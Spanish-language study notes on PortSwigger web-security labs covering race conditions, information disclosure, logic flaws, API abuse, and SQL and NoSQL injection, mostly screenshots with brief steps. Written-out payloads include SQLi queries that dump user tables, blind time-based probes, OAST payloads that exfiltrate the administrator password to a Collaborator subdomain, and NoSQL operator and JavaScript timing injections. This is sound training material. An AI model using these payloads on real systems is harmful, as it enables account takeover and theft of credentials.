En un momento dado nuestro TurboIntruder puede ser más ráido que la validación de la web y que el tiempo de envío de nuestras requests no sea el mismo de lo que la web :
![[Pasted image 20240304103356.png]]
Ya sea por la arquitectura de Red o por las operaciones que hayamos hecho.
Podemos ganar el ID de sesión de una víctima:
![[Pasted image 20240304112945.png]]

## Evitar las Race Conditions

1. Evite mezclar datos de diferentes lugares de almacenamiento.
2. Garantice cambios de estado atómicos en endpoints sensibles mediante una única transacción de base de datos.
3. Aproveche la integridad y consistencia de la tienda de datos para una defensa en profundidad.
4. No use una capa de almacenamiento para asegurar otra; por ejemplo, las sesiones no son suficientes contra ataques de sobrecostos en bases de datos.
5. Mantenga la consistencia interna en el manejo de sesiones; evite actualizaciones individuales peligrosas.
6. En algunas arquitecturas, considere evitar el estado del lado del servidor y utilice cifrado para gestionar el estado del cliente, como JWTs.
### Lab - Limit Race Condition
Sin logeo, aplicamos descuento para identificar de qué manera llegan los descuentos.
Identifico que pasa si aplico el code más de una vez:
![[Pasted image 20240229105102.png]]
Envío al repeater: ![[Pasted image 20240229105150.png]]
Si le quito la cookie se vacía el carrito, esto quiere decir que la web es almacena el carro en el lado del server:
![[Pasted image 20240229105458.png]]
Estando logeado el carro está vacio pero el número dice lo contrario
![[Pasted image 20240229112639.png]]
![[Pasted image 20240229112649.png]]
Vuelvo  a añadir la chaqueta ya logado y añado el cupón.
Mando la petición al repeater
![[Pasted image 20240229113159.png]]
Esa petición, clickamos btn+derecho -> extensiones -> turbo intruder
Ataco con race-single packet attack
![[Pasted image 20240229113349.png]]
Puedo cambiar el número de veces que atacamos
![[Pasted image 20240229113621.png]]
EL siguiente paso es eliminar el descuento de la web a mano, atacamos y refrescamos
![[Pasted image 20240229113559.png]]
Obtenemos el descuento varias veces
![[Pasted image 20240229113530.png]]

### Lab - Bypassear límites con race condition BForce
Notamos que si me logeo mal me dará 1 minuto de castigo
Si agrupamos estas solicitudes no nos bloquea el login, por lo que esta web es HTTP/2
![[Pasted image 20240229125502.png]]
Tras enviar 4 veces sin agrupar
![[Pasted image 20240229125450.png]]

![[Pasted image 20240229125627.png]]
![[Pasted image 20240229125716.png]]
noto que después de este ataque no pone límite de tiempo
Mando al intruder con user carlos y la passwd en valor aleatorio
![[Pasted image 20240229130438.png]] 
dejo una wordlist en el portapapeles debido a la función de : password=wordlist.clipboard
![[Pasted image 20240229125938.png]]
Tengo que esperar a que cese el castigo, lo puedo mirar mandando las solicitudes agrupadas, cuando acabe, atacaremos
Podemos ver la passwd en el código de error 302:
![[Pasted image 20240229133444.png]]

### Lab - Condiciones de carrera Multi-Punto

Si añadimos la tarjeta de regalo a l carro y luego nos logeamos el carro qeda vacío, esto es un indicio de web vulnerable a window race:
Mapeamos toda la web y enviamos a REPEATER -->
POST /cart y  /cart/checkout
Lo agrupamos 
![[Pasted image 20240304105412.png]]
Nos fijamos en el id de producto
![[Pasted image 20240304105403.png]]
Vamos a la página  de la chaqueta que tiene Id=1
![[Pasted image 20240304105446.png]]
Agrupamos en una sola conexión
![[Pasted image 20240304110854.png]]
![[Pasted image 20240304105427.png]]
Nos tiene que salir esto en el response:
![[Pasted image 20240304110026.png]]
Eliminamos la chaqueta del checkout y cambio a enviar en paralelo
![[Pasted image 20240304110825.png]]
Si no sale, añadimos la tarjeta de regalo tantas veces como sea necesario hasta que se añada la chaqueta a la carta
![[Pasted image 20240304110753.png]]
### Lab - condiciones de carrera de un endpoint
Mapeamos todo, si añado un producto y luego me logeo desaparece, es vulnerable a race condition:

En el apartado de cambiar email, hago una solicitud a un correo random
![[Pasted image 20240304114325.png]]
Mando al REPEATER el POST /email-change, con 2 solicitudes iguales, cambio ligeramente la anterior en una y  la 2 pongo el correo enumerado real
![[Pasted image 20240304114518.png]]
![[Pasted image 20240304114810.png]]
Hago un grupo de peticiones enn paralelo
![[Pasted image 20240304114528.png]]
La solicitud en mi buzón vendrá con el correo que no es real, lo confirmamos y actualizamos la web 
![[Pasted image 20240304114739.png]]
Ganamos acceso
![[Pasted image 20240304114707.png]]
### Lab - time-sensitive Race Condition
Mapeamos la web sobre todo el GET y POST de forgot-password
Mando e GET al REPEATER
![[Pasted image 20240304131414.png]]
Envío 2 peticiones iguales al REPEATER:
![[Pasted image 20240304131439.png]]
Le quito el phpssid al GET y lo mando, el response me devuelve un PHPSSID y un CSRF el cual cambio por las peticiones de POST, lo mando otra vez para nuevos tokens en la 2 petición:
/GET
![[Pasted image 20240304131841.png]]
/POST
![[Pasted image 20240304131828.png]]
![[Pasted image 20240304132011.png]]
Creo un grupo que me permita mandar peticiones en paralelo con las 2 POST:
![[Pasted image 20240304133150.png]]
En una de las peticiones cambio el username por carlos:
![[Pasted image 20240304133252.png]]
Dejando cómo está la petición 2 para que nos sigan mandando los emails de confirmación pero con el token de carlos a la vez que el nuestro, estaríamos aprovechando una NO validación del segundo token al mismo tiempo que valida el legítimo de wiener.
En Email , espero a mi token
![[Pasted image 20240304132656.png]]
Taas llegar mi email de confirmación todo lo que hago es cambiar wiener por carlos en la URL.
![[Pasted image 20240304132707.png]]

# Divulgación de información - Information Disclosure

## Motivos

Esta acción se produce cuando un sitio web revela info sensible sin intención de hacerlo:
- Capacidad financiera de la empresa
- Info de usuarios
- Detalles técnicos del sitio web o infraestructura de la empresa
- Revelando archivos ocultos en `robots.txt` o `sitemap.xml
- Mencionar explícitamente la tabla de bases de datos o nombres de columna en mensajes de error
- Cuidado con el código fuente
## ¿Cómo detectarlo?
- Nos fijaremos en los códigos de acceso
- Fuzing con TurboIntruder
- Aplicar reglas grep para comparar el contenido
- Identificar palabras como `error`, `invalid`, `SELECT`, `SQL`

### Lab - Divulgación en mensajes de error
Lapágina no tiene mucho más, iremos a productId=1 y  cambio el 1 por la cadena 'yak'
![[Pasted image 20240305103434.png]]
Nos fijamos e n que da error 500 y abajo del todo nos da la flag
![[Pasted image 20240305103455.png]]
![[Pasted image 20240305103458.png]]

### Lab -  Divulgación en depuración - Debugger

- La información de depuración a veces puede ser registrada en un archivo separado
AL hacer un escaneo activo me doy cuenta del siguiente archivo y le doy a encontrar referencias
![[Pasted image 20240305105030.png]]
Encuentro un comentario de dónde está el archivo debugger
![[Pasted image 20240305104945.png]]
Lo manod al REPEATER y busco la cadena "secret"
![[Pasted image 20240305105049.png]]
Podemos ver que hay info sensible
![[Pasted image 20240305105112.png]]

###  Lab - Divulgación de datos sensibles por copia de seguridad

Realizamos un escaneo activo, en apartado TARGET, obtenemos robots.txt
![[Pasted image 20240305110324.png]]
Vamos al directorio y pinchamos en alrchivo Js
![[Pasted image 20240305110357.png]]
Obtenemos la passwd hasheada
![[Pasted image 20240305111138.png]]

### Lab - Autenticación a través de divulgación de info
- Los sitios webs utilizan configs de terceros, y hay utilidades que se olvida deshabilitar o no se sabe bien cómo funciona.
- HTTP  `TRACE` , este método esta disñado para diagnóstico de la web
Nos fijaremos en el RESPONSE en algo que nos pueda dar autorización
EL enunciado nos dice que hay un panel de admin, cambiaremos GET por TRACE
![[Pasted image 20240305114753.png]]
Nos suelta info sensible
![[Pasted image 20240305114812.png]]
Vamos a config y añadimos la cadena en match/replace, todas las siguiente speticiones se añadián con esta cabecera apuntando a nuestro SERVER
![[Pasted image 20240305114537.png]]
Obtengo el panel
![[Pasted image 20240305114736.png]]

### Lab - Divulgación de info en control de versiones

Se me ocurre probar /git o /.git en la URL

![[Pasted image 20240305122558.png]]
Como no podemos ver nada con, Burp iremos a KALI 
1. Descargamos el repo a través de wget -r URL
2. Instalamos el siguiente paquete, es para comprobar el historial de ese repositorio
![[Pasted image 20240305122048.png]]
Abrimos el archivo en entorno gráfico
![[Pasted image 20240305122430.png]]
Commit> amend Last Commit
![[Pasted image 20240305122633.png]]
Obtenemos passwd de admin
![[Pasted image 20240305122711.png]]

## [MisteryLab Done]

# Lógica Empresarial

Estos errores son de implementación de una infraestructura y que el administrador no sabe bien cómo funciona, no añadiendo así la lógica necesaria para su ciberdefensa.

- Preguntas que debo hacerme sobre la entrada de datos
1. ¿Dónde está el límite que se imponga a esos datos?
2. ¿Qué pasa cuándo llego a ese límite?
3. ¿Se realizan transformaciones o normalizaciones en su entrada?
### Lab - confianza excesiva en client-side

Podemos explotar la web ya que han dejado la lógica en el lado del cliente y podemos modificar antes de que llegue al lado del servidor.
Me logeo  y simplemente modifico el precio expuesto cómo parámetro, también la cantidad, esta entrada se valida desd nuestro lado y el server no, por eso se hace efectiva
![[Pasted image 20240306113343.png]]
Vemos esta petición y obtenemos la flag
![[Pasted image 20240306113254.png]]

### Lab - Vuln Lógica de alto nivel 

Observo que en el POST /cart, puedo ponerle valores negativos:
1. Añado 1 chaqueta
2. Añado OTRO producto y le resto 13 veces su cantidad
3. Esta operación resta el total del precio
4. Obtenemos la chaqueta por menos de 100€

![[Pasted image 20240306121156.png]]

![[Pasted image 20240306121515.png]] 

![[Pasted image 20240306121554.png]]![[Pasted image 20240306121606.png]]

### Lab - Vuln lógica a bajo nivel

Nos logeamos y me hago la 1 y 2 pregunta:
1. ¿Dónde está el límite que se imponga a esos datos?
2. ¿Qué pasa cuándo llego a ese límite?
Resulta que sólo puedo pedir 99 y lo mando al intruder

![[Pasted image 20240306130918.png]]
Payload indefinidos y nulos y vamos observando que la cesta cambia a valores negativos, lo que ha pasado es que la  Ha superado el número entero permitido definido en back-end por enviar  99 productos cada request y empieza a ir hacia el 0.
![[Pasted image 20240311132314.png]]
Vaciamos cesta
![[Pasted image 20240311132435.png]]
Añado la cantidad exacta de 323
![[Pasted image 20240306130905.png]]
Resource pool a 1
![[Pasted image 20240311132602.png]]
Observamos el valor negativo
![[Pasted image 20240311132548.png]]
Elimino cesta y añado en la petición POST /cart del repeater la cantidad de 47
![[Pasted image 20240311132652.png]]
Se resta la cesa
![[Pasted image 20240311132636.png]]
Añadimos un producto cualquiera hasta que el resultado de un número entre 0-100€
![[Pasted image 20240311132903.png]]

### Lab - Manejo de entradas excepcionales
Escaneamos todos los posible directorios y nos encontramos con un /admin el cuál nos dice que sólo podemos acceder a él con correo @dontwannacry.com

![[Pasted image 20240312121414.png]]
![[Pasted image 20240312121345.png]]
Ponemos más de 200 caracteres y el correo de nuestro buzón a ver si se lo traga
![[Pasted image 20240312122713.png]]
Podemos acceder a nuestra cuenta pero no sale el admin panel porque no somos dontwannacry.com
Cambiamos del correo de exploit al siguiente que tenemos separado un dominio de otro por `.
![[Pasted image 20240312124946.png]]
Ponemos el cursos a la derecha de la `m` y tiene que estar exactamente en el caracter 256
![[Pasted image 20240312123109.png]]
![[Pasted image 20240312124850.png]]
Nos logeamos y obtenemos admin panel
![[Pasted image 20240312124448.png]]

![[Pasted image 20240312124427.png]]

### Lab -  Control de seguridad incongruente
Simplemente me logeo con mi correo de explotación, valido el correo a través del link y updateo mi correo con el dominio @dontwannacry.com
![[Pasted image 20240312164318.png]]
Updateo
![[Pasted image 20240312164327.png]]

### Lab - weak isolation in endpoint double use
Observamos esta petición en el Burp
![[Pasted image 20240312170647.png]]
Simplemente le quitamos el parámetro current-password el cual no valida en el server y añado el cambio de contraseña que se me antoje.
![[Pasted image 20240312170917.png]]
![[Pasted image 20240312170947.png]]
Refresco y me logeo con las credenciales de administrator

### Lab - Validación insuficiente del flujo

Antes de logearnos añadimos algo a la bolsa, si no se añade el producto al logearnos es que el sitio puede que sea vulnerable
Añadimos un producto por debajo de 100$
![[Pasted image 20240312173412.png]]
Al vaciarse nuestra cesta, añadimos la chaqueta y mandamos al Repeater esta petición, que como no valida en el server, compraremos lo que haya en la cesta valga lo que valga
![[Pasted image 20240312173508.png]]
![[Pasted image 20240312173524.png]]

### Lab - Bypassear autenticación por una máquina de estado
Me logeo, y podemos noar que hay una petición para delimitar el rol de cada usuario, 
ITERCEPTO peticiones, y DROPEO esta, actualizo en la URL a la página princial sin dejar de interceptar el tráfico.
![[Pasted image 20240312174752.png]]
Obtenemos accesode admin, eludiendo este filtro
### Lab  - Forzando Reglas de negocio defectuosas
Nos da el código: `NEWCUST5` y `SIGNUP30`
![[Pasted image 20240312181035.png]]
Los voy poniendo uno detrás de otro hasta comprarla por 0$
![[Pasted image 20240312181239.png]]

### Lab - Defecto de lógica dinero infinito
Siempre que haya un apartado de tarjeta de regalo, compraremos la gift card
![[Pasted image 20240312183243.png]]
![[Pasted image 20240312183407.png]]
Tras meter el código de tarjeta regalo incrementamos el dinero, si lo metemos otra vez nos da error:
![[Pasted image 20240312183454.png]]
Crearemos una macro
![[Pasted image 20240312183836.png]]
En Scope  --> Include All URL
![[Pasted image 20240312183958.png]]
Pulsamos ADD en la petición 4 --> configure items
![[Pasted image 20240312184204.png]]
En la petición 5 y testeamos macro --> configure items
![[Pasted image 20240312184718.png]]
AL testear nos saldrán estos códigos si son diferentes, no están correctos
![[Pasted image 20240312184704.png]]
Mandamos la petición al INTRUDER con payloads nulos a 412
![[Pasted image 20240312192332.png]]
Nuestro crédito pasa de 100 a 1338$
![[Pasted image 20240312192431.png]]

### Lab - Bypasseando la autenticación vía oráculo de encriptación

En el apartado comment, vemos que respuesta nos da al poner los parámetros mal
![[Pasted image 20240313111841.png]]
Llamaremos a la petición post /comment ENCRYPT y GET /post DECRYPT
![[Pasted image 20240313112524.png]]
Nos fijamos que el response  de /comment  tiene notification
![[Pasted image 20240313111820.png]]
Cojo el stayloggedin  y lo pongo en notification del GET
![[Pasted image 20240313112731.png]]
![[Pasted image 20240313112758.png]]
Suelta el usuario que tenemos en el response
![[Pasted image 20240313112810.png]]
Así que copiaremos ese número haciéndonos pasar por administrator
![[Pasted image 20240313113029.png]]
Copiamos la notification del response y vamos a la peticion de DECRYPT:
![[Pasted image 20240313113313.png]]
Para asegurarnos de que lo hacemos con adminsitrator mandaremos la petición
![[Pasted image 20240313113325.png]]
Decodeamos y encodeamos decode > URL > d base64 > quitamos 23 bytes desde hex> encode base64 > encode URL
![[Pasted image 20240313124232.png]]
![[Pasted image 20240313122236.png]]
EL response del GET nos suelta que tiene que ser múltiplo de 16 así que probaremos caracteres hasta que ponga administrator en texto claro
![[Pasted image 20240313122218.png]]
![[Pasted image 20240313124412.png]]
Decodeamos pero esta vez le quitamos 32 bytes

![[Pasted image 20240313124514.png]]
Visitamos la págima principal quitándole el id de session y añadiendo toda la url encodeada
![[Pasted image 20240313124454.png]]
# [ MisteryLab Done]

# API Testing (Application Programming Interface)

- Permite a los sistemas de software compartir datos
- Socavan temas de confidencialidad, integridad y disponibilidad de un sitio web 
- Trataremos las APIs que no son utilizadas por el front-end con enfoque JSON APIs y RESTful
- Testing con SQLi
#### Fases de Ataque:
Identificar llamadas de API ejemplos: 
- `GET /api/books HTTP/1.1`
- `GET /api/books/mystery`
- Identificar límites y mecanismos de autentcación
- Respuestas HTTP que aceptan
- Datos de entrada de API incluyendo parámetros
#### Observar Documentación
La documentación de APIs se recoge en XML o JSON
- BurpScanner
- `/api`
- `/swagger/index.html`
- `/openapi.json`
Si identidicamos el endpoint `/api/swagger/v1/users/123` , también identificar:
- `/api/swagger/v1`
- `/api/swagger`
- `/api`

### Lab - Explotando una APi usando documentación
Para escanear las APIs  crorrectamente, utilizaremos la extensi´n Parser de OpenAPI:
![[Pasted image 20240327142256.png]]

Nos lgeamos ye scaneamos el sitio, simplemente buscamos la Api ya logeados, y podemos editar el apartado delete, pondremos el user carlos

![[Pasted image 20240327142841.png]]
![[Pasted image 20240327142901.png]]

### Lab - Encontrando un endpoint API no utilizado
Tenemos que jugar con el tipo de solicitud
Si encontramos /api/tasks -->
- `GET /api/tasks`- Recupera una lista de tareas.
- `POST /api/tasks`- Crea una nueva tarea.
- `DELETE /api/tasks/1`- Suprime una tarea.

- `GET`- Recupera datos de un recurso.
- `PATCH`- Aplica cambios parciales en un recurso.
- `OPTIONS`- Recupera información sobre los tipos de métodos de solicitud que se pueden utilizar en un recurso.
Instalaremos la extensión JSLinkFinder, parsea endpoints de API de JS
![[Pasted image 20240327144250.png]]
Tambié instalaremos este convertidpr de datos de Content-Type:
![[Pasted image 20240327145324.png]]
a la solicitud le cambiamos `GET por OPTIONS` y observamos que opciones tenemos
![[Pasted image 20240327145934.png]]
Al probar `PATCH` nos dice que tenemos que añadir un content-type y application/json
![[Pasted image 20240327150134.png]]
Nos damos cuenta del orden del `Content-type` fijándonos en otras solicitudes
![[Pasted image 20240327150536.png]]
Ponemos unos `{}` cualesquiera al final del documento
![[Pasted image 20240327150553.png]]
Nos especifica que falta un parámetro así que le ponemos el precio a 0€
![[Pasted image 20240327150624.png]]
![[Pasted image 20240327150634.png]] 
Podemos comprar la chaqueta por 0 eurazos
![[Pasted image 20240327150704.png]]

### Lab - Explotando vuln de asignación masiva

AL JSON devuelto, le añadiremos una variable `isAdmin` o la variable estabñecida y probaremos valores válidos como `true o false` e inválidos:

Nos fijamos en el error, las opciones que nos da son GER  y POST
![[Pasted image 20240327182421.png]]
Me fijo en que el parámetro  chosen_products está en la respuesta legítima al añadir algo al carro y pide un array
![[Pasted image 20240327183549.png]]
![[Pasted image 20240327183219.png]]
Pongo los mismos valores, y me deja crear algo en la carta
![[Pasted image 20240327183143.png]]

### Lab - exploit  el lado del sercidor con cadena de consulta

En la petición forgot-password reseteamos las contraseñas de los users enumerados administrator y carlos

![[Pasted image 20240331174036.png]]
![[Pasted image 20240331174311.png]]
Ponemos OPTIONS a ver qué ofrece
![[Pasted image 20240331174328.png]]/

Añadimos valores y observamos el comportamiento
![[Pasted image 20240331175755.png]]
Con un & sale esto 
![[Pasted image 20240331175805.png]]
con un %26 en vez de &
![[Pasted image 20240331180618.png]]
- Probamos con el campo field y poniendo username o email nos suelta info
- Probaremos con fuzzing a ver si hay algún campo interesante
Lo mandamos al intruder
![[Pasted image 20240331180547.png]]
Ponems este payload en intruder hasta que sale la cadena reset_token, son cadenas del server-side
![[Pasted image 20240331181025.png]]
Damos con el fielde reset_token
![[Pasted image 20240331181358.png]]
Ponemos todo en la url
- Cuándo hay un campo dentro de una web a rellenar se pone  `?`
![[Pasted image 20240331181452.png]]
Cambiamos la password del user administrator ya que es su token y obtengo flag

### Lab - Explotando server-side en una REST URL
Directamente probamos el campo del ejercicio anterior
![[Pasted image 20240331182548.png]]
Nos sugiere que pongamos otra ruta

Poniendo ../../../../
![[Pasted image 20240331182715.png]]
Probamos con `openapi.json#`
![[Pasted image 20240331183011.png]]
Nos damos cuenta que en este JS nos dice los parámetros de la URL
![[Pasted image 20240331183501.png]]
![[Pasted image 20240331183452.png]]
Simplemente los cambio por field, añadiendo la ruta anterior encontrada
![[Pasted image 20240331184049.png]]
![[Pasted image 20240331184058.png]]
Al darnos error, simplemente ponemos ../../ hasta encontrarlo
![[Pasted image 20240331184113.png]]
Consigo el token y cambio la password a través de la rl especificada en el archivo `fotgotPassword.js
![[Pasted image 20240331184121.png]]
# SQL Inyection

1. Valor '

2.  Booleanos como 1=1 o 1=2  true-false

3. Añadir script que ejecute delay para ver que ejecuta la BD

4. OAST Payload para desencadenar una interacción de red fuera de banda

Un Ejemplo:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

La restricción `released = 1` se está utilizando para ocultar productos que no se liberan. Podríamos suponer para productos inéditos, `released = 0`.

#importante Ayuda --> https://portswigger.net/web-security/sql-injection/cheat-sheet

### Lab 1 y 2 - Inyección normal

  Simplemente en la url pongo ' or 1=1 --
Muestra todas las categorías:

![[Pasted image 20240212122058.png]]
### Lab 

Haremos la misma inyección pero sin user antes de la primera ' podemos enumerar algún usuario:
![[Pasted image 20240228175657.png]]
El response nos da:
![[Pasted image 20240228175830.png]]
La siguiente inyección será y nos logeamos como admin:
administrator'or'1'='1'--

Si el response nos da error de CSRF token, simplemente refrescamos la página y actualiza el csrf que tiene un número limitado de peticiones:
![[Pasted image 20240228180022.png]]
### Lab -  SQLI Oracle
Tenemos vulnerabilidad de inyección SQL en el filtro de categoría de producto.
Como cambiamos de motor a Orcale, las conusltas son distintas:
Para sacar la versión sería:
|Oracle| --> `SELECT banner FROM v$version  | SELECT version FROM v$instance`|

con un UNION SELECT simple
Vemos que tiene dos tablas tras ir probando con null, cambio un null por banner y comento con --  
#importante Los `+` son espacios

![[Pasted image 20240228181715.png]]

### Lab - Versión en MYSQL o MICROSOFT

Simplemente el comentario es diferente aunque la consulta es la misma:
![[Pasted image 20240228182821.png]]
![[Pasted image 20240228182832.png]]

### Lab  - Sacar user y passwords SQL

Primero quiero saber el nombre de la BD y el usuario actual
![[Pasted image 20240228183837.png]]
![[Pasted image 20240228183847.png]]

Las siguientes dos consultas sirven para sacar tablas las cuales tendremos que deducir dónde está el user y passwd
![[Pasted image 20240228190105.png]]

-'+union+select+column_name,null+from+information_schema.columns--
Sacamos la tabla `users_lhprvj
Consultamos las columnas de esa tabla
-'+union+select+column_name,null+from+information_schema.columns+where+table_name='users_lhprvj'--
![[Pasted image 20240228191806.png]]
Consultamos los datos de los campos username_qywmte y password_apkozo
-'+union+select+username_qywmte,password_apkozo+from+users_lhprvj--
#importante Hay veces que hace falta poner la BD con la tabla = `BD.users_lhprvj

![[Pasted image 20240228192355.png]]
### Lab - Listing database contents on Oracle
- You can list tables by querying `all_tables`:
    `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`:
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
- Comment :
	`--
	Sabemos que hay una vulnerabilidad en el filtro de categoría de producto
Dertemino que hay dos columnas:
![[Pasted image 20240401183439.png]]
Buscamos todas las tablas existentes y encontramos una que contiene los usuarios
![[Pasted image 20240401183821.png]]
![[Pasted image 20240401184140.png]]
Con la siguiente consulta sacamos lo que hay en las columnas
`-'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name='USERS_HELRFP'+--
![[Pasted image 20240401184151.png]]
Finalmente sacamos los usuarios y contraseñas
![[Pasted image 20240401185008.png]]

### Lab - Enumerando tablas de bd con order by

![[Pasted image 20240401190612.png]]
Si nos pasamos de las columnas que tiene, nos dará un error así:
![[Pasted image 20240401190640.png]]

### Lab - Obteniendo datos concatenando

![[Pasted image 20240401192943.png]]

Obtengo los users
### Lab- Encontrar columnas por tipo de dato
Encontramos columnas con order by
![[Pasted image 20240401190612.png]]
Encontramos que la 3 columna es de tipo string
![[Pasted image 20240401191454.png]]
### Lab - Blind SQLI con delay
Probamos con todas las Bases de Datos del cheatsheet, resulta que es MySQL
![[Pasted image 20240228202125.png]]

Quiere decir que si la consulta es true, haz un sleep de 10 segundos
al clickar en una categoría hace la consulta, por lo tanto esa parte es verdadera, ahora separamos el sleep de la consulta anterior
![[Pasted image 20240228202318.png]]

### Lab - BLIND SQLi con respuestas condicionales
La respuesta no mostrará nada pero sí un mensaje de "Welcome Back"
El enunciado  dice que la password será alfanumérica con caracteres en minúscula
![[Pasted image 20240402113026.png]]
![[Pasted image 20240402113017.png]]
La password contiene una 'a'
![[Pasted image 20240402115426.png]]
Sabemos que la password tiene 19 caracteres:
![[Pasted image 20240402115657.png]]
Mandamos esta consulta al intruder, significa que extrae el primer carácter de la columna password mientras que sea 'a', como el primer caracter no es 'a' no saldrá Welcome Back, por eso lo enviaremos al intruder apuntando la contraseña 19 veces
![[Pasted image 20240402121249.png]]

### Lab - Blind SQLi con errores condicionales
Atentaremos con sqli en el parámetro de trackID

- Si ponemos esta consulta y no devuelve ningún error, significa que existe la tabla:
`||(SELECT+''+FROM+users+WHERE+ROWNUM=1)||'
- Con la siguiente si nos da un error verificamos que el usuario existe:
`||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Con esto determinamos que hay 2 caracteres, nos da error cuándo la consulta es correcta:
`||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END FROM users WHERE 
- Mandamos esta petición al intruder, averiguando letra por letra, nos fijaremos en el error `500
`||(SELECT CASE WHEN SUBSTR(password,1,1)='§k§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

### Blind SQLi con retraso de tiempo y recuperación de info
Esta vuln no muesta error, ni respuesta por pantalla
- Si ponemos una condición verdadera la página tardará 10 minutos en recargar por el sleep
``%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
- Averiguamos si posee el usuario administrator
`%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- Averiguamos los caracteres que tiene
`%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- Lo mandamos al intruder y variando el primer `1` del SUBSTRING  password del 1 al 20
`%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--

### Lab - Blind SQLi con interacción fuera de banda (OAST)

Necesitaremos a BurpCollaborator, ponemos el payload y seguidamente vamos a la Pestaña --> Collaborator --> Poll Now

`+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

### Lab - Blind SQLi exfiltración de datos OAST

En trackID comprobaremos si el campo es vulnerable a los ataques OAST
![[Pasted image 20240403115647.png]]
![[Pasted image 20240403115703.png]]
Vemos que la web responde así que probaremos lo siguiente para sacar la contraseña del `administrator`

- `+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
Nos fijamos que en el payload separamos la password del subdominio de collaborator con un `.` --> Obtenemos la password antes del `.`
![[Pasted image 20240403120612.png]]

### Lab - Exfilración de datos encoding SQL a XML
Cogeremos esta petición y nos fijaremos en productID y stockID
![[Pasted image 20240403122856.png]]
Provocamos un error en el recuento de unidades
![[Pasted image 20240403122906.png]]
![[Pasted image 20240403122915.png]]
Vemos que tienen un WAF, una manera de saltarlo es el hackvertor
![[Pasted image 20240403123111.png]]
![[Pasted image 20240403123122.png]]
A nuestra entrada de datos pulsamos en btn + drch --> hackvertor --> decode -> dec_entries o hex_entities
![[Pasted image 20240403125553.png]]
Probamos a quitar uno de los dos y en los campos de store y product, vemos que sólo tiene una tabla y que es de tipo STRING
![[Pasted image 20240403130613.png]]
![[Pasted image 20240403130626.png]]
Observamos todas las tables y vemos una llamada users
![[Pasted image 20240403130745.png]]
concatenamos para que nos de los nombres y contraseña del usuario directamente
1 UNION SELECT username |'<>'| password FROM users
![[Pasted image 20240403130829.png]]

# NoSQL injection
## Métodos y curiosidades
- Estas bases de datos no see almacenan en estructuras condicionales como SQL, pueden tener un lenguaje personalizado, JSON , BSON o XML, se pueden consultar en APIs como MONGODB o Couchbase.
- Tenemos Amazon Neptune y Neo4j que son bases de datos basadas en gráficos, son bastante escalables y ágiles.
- MongoDB es la más popular de NoSQL
- Pondremos este paylad para saber si la BD limpia bien las cadenas --> `%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
- En JSON sería --> ``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``
- `' && 1 && 'x`
- Probar con `'` o escapando con `\`
- Probaremos esta condición JS `'||1||'` que se convierte a `%27%7c%7c%31%7c%7c%27` y en MOngoDB se ve como `'fizzy'||'1'=='1'`, quiere decir que el campo es fizzy o 1  = 1, codición booleana
- También probaremos esto --> ``'"`{ ;$Foo} $Foo \xYZ``
-  En JSON probaremos  --> `{"username":{"$ne":"invalid"}}`
- en URL --> `username[$ne]=invalid`
- Si no funciona probaremos método de solicitud de `GET`a `POST`
- Cambiar el `Content-Type`cabeza de a `application/json`.
- Añadir JSON al cuerpo del mensaje.
- Inyectar operadores de consulta en el JSON.

#Operadores
- `$where`- Coincide con documentos que satisfacen una expresión de JavaScript.
- `$ne`- Coincide con todos los valores que no son iguales a un valor especificado.
- `$in`- Coincide con todos los valores especificados en un array.
- `$regex`- Selecciona los documentos en los que los valores coinciden con una expresión regular especificada.
- Lo siguiente quiere decir, que si el JSOn no procesa esta entrada, mostrará todos los users y passwords diferentes a invalid
 `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
 - Lo siguiente apunta a una de esas cuentas con una contraseña distinta de ' '
 `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
 - Tras enumerar usuarios podemos mandar esto al intruder para averiguar la passwd desde el JSON
 `{"username":"admin","password":{"$regex":"^a*"}}`
 - Tambien podemos saber la passwd probando caracteres si la web tarda en cargar el tiempo que le decimos:
  `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`
  `admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
## Restricciones
- Si la consulta de MongoDB lleva this.released == 1, significa que no atenderá a una interacción que no sea la que pide
- Utilizaremos un byte nulo --> =Gift'%00
## Insatlaremos Content Type Converter:
Extensión que convierte las peticiones de JSON a XML o viceversa
### Lab - Detectando NoSQL injection
Poniendo `'` ya conseguimos un error, también obtenemos alguna ruta de un JS y el puerto donde corre el servicio MONGODB
![[Pasted image 20240403142550.png]]
Pnemos `'||1||'` y sale en el output por lo que es inyectable
![[Pasted image 20240403143036.png]]

### Lab - Explotando operadores NoSQL
En la petición POST de LOGIN y observamos cómo hay algún error por lo que la web es inyectable
![[Pasted image 20240404110207.png]]
